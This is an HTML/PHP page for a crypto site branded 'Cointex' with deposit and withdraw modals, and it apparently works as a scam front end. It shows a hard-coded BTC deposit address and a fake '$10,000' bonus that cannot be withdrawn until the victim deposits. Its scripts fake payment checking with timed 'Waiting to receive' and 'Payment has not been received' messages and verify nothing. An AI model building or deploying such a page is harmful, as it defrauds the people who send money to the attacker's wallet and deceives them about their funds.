<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">

        <!--=============== BOXICONS ===============-->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
        <!--=============== CSS ===============-->
        <link rel="stylesheet" href="assets/css/styles.css">
        <title>Transaction</title>
    </head>
    <body>
        <section class="modal contain">
            <div class="modal__container" id="deposit">
	<div class="modal__content">
		<div class="logo">
       	 <a href="#"><img src="./assets/img/logo.svg" alt="Cointex logo"></a>		
		</div>
               		     <h4 class="modal__title">Deposit</h4>
		<div class="details">
			<p>Note: BTC only</>
			<input id="wallet" value="bc1qt99054dwt4d97fwzuxzv3k9drmkfu7aurvv5ks">
			   <button onclick="copy()"><span class="material-symbols-outlined">file_copy</span></button>
		</div>
		<div class="concopy" id="confirm">
			<h4>Copied!!!</h4>
		</div>
		<div class="img" id="img">
			<img src="./assets/img/address.png" alt="scan">
		</div>
		<div class="detail">
			<button id="sent" onclick="check()">Confirm payment</button>
			<h5 class="pay" id="sentnote">Waiting to receive...</h5>
			<button id="check" onclick="again()">Check again....</button>
			<h5 class="pay" id="checknote">Payment has not been received</h5>
			<button id="again" onclick="finish()">Okay</button>
			<h5 class="pay" id="againnote">Please ensure your copied the correct address and wait for 3-5mins to confirm</h5>
			<div class="divs" id="div">
				<div></div>
				<div></div>
				<div></div>
			</div>
			<a href="#">Go back</a>
		</div>
		
	</div>
            </div>
            <div class="modal__container" id="withdraw">
	<div class="modal__content">
		<div class="logo">
       	 <a href="#"><img src="./assets/img/logo.svg" alt="Cointex logo"></a>			
		</div>
               		     <h4 class="modal__title">Withdraw</h4>
		<div class="detail">
			<p id="read">You can not withdraw your bonus till you <a href="#">Deposit</a></p>
			<input type="text" placeholder="Amount" value="$10,000">
			<input type ="text" placeholder="Receiver's wallet address">
			<button onclick="disable()" id="button">Send</button>
			<a href="#">Go back</a>
		</div>
	</div>
            </div>
        </section>
    </body>
<script>
 if(localStorage.getItem('Check') =='one'){
	var img = document.getElementById("img");
img.style.display = "none";
check();
}
	function copy(){
	var sent = document.getElementById("sent");
	var sentnote = document.getElementById("sentnote");
	var div = document.getElementById("div");
	var wallet = document.getElementById("wallet");
	var confirm = document.getElementById("confirm");
	var img = document.getElementById("img");
	 wallet.select();
	document.execCommand('copy');
	wallet.blur();
	confirm.style.display = 'block';
	setTimeout(function(){confirm.style.display = "none";}, 2000);
	setTimeout(function(){img.style.display = "none";}, 3000);
	setTimeout(function(){sent.style.display = "block";}, 3000);
	setTimeout(function(){sentnote.style.display = "block";}, 3000);
	};

function check(){
	var div = document.getElementById("div");
	var sentnote = document.getElementById("sentnote");
	var checknote = document.getElementById("checknote");
	var sent = document.getElementById("sent");
	var check = document.getElementById("check");
div.style.display = "flex";
	setTimeout(function(){sentnote.style.display = "none";}, 5000);
	setTimeout(function(){checknote.style.display = "block";}, 5000);
	setTimeout(function(){div.style.display = "none";}, 5000);
	setTimeout(function(){sent.style.display = "none";}, 4000);
	setTimeout(function(){check.style.display = "block";}, 5000);
		localStorage.setItem('Check', 'one');
}

function again(){
	var div = document.getElementById("div");
	var check = document.getElementById("check");
	var again = document.getElementById("again");
	var checknote = document.getElementById("checknote");
	var againnote = document.getElementById("againnote");
div.style.display = "flex";
	setTimeout(function(){check.style.display = "none";}, 6000);	
	setTimeout(function(){div.style.display = "none";}, 7000);
	setTimeout(function(){again.style.display = "block";}, 7000);
	setTimeout(function(){againnote.style.display = "block";}, 7000);
	setTimeout(function(){againnote.style.color = "#aa0022";}, 7000);
	setTimeout(function(){checknote.style.display = "none";}, 7000);
		if(localStorage.getItem("Check") !== null){
localStorage.removeItem("Check");
	}
}

function finish(){
	var div = document.getElementById("div");
	var again = document.getElementById("again");
	var againnote = document.getElementById("againnote");
	var img = document.getElementById("img");
div.style.display = "flex";
	setTimeout(function(){div.style.display = "none";}, 5000);
	setTimeout(function(){again.style.display = "none";}, 4000);
	setTimeout(function(){againnote.style.display = "none";}, 5000);
	setTimeout(function(){img.style.display = "block";}, 5000);
}

	function disable(){
	button = document.getElementById("button");
	text = document.getElementById("read");
	button.disabled = true;
	text.style.display = 'block';
	text.style.color = '#aa0022';
	};
</script>
</html>
<?php

if(isset($_GET['token']) && $_GET['token'] == "withdraw"){ 
echo "<script>
	let popout = document.getElementById('withdraw');
		popout.classList.add('show-modal');

	</script>";
}else{
echo"<script>
	let popout = document.getElementById('deposit');
		popout.classList.add('show-modal');
	</script>";
}

?>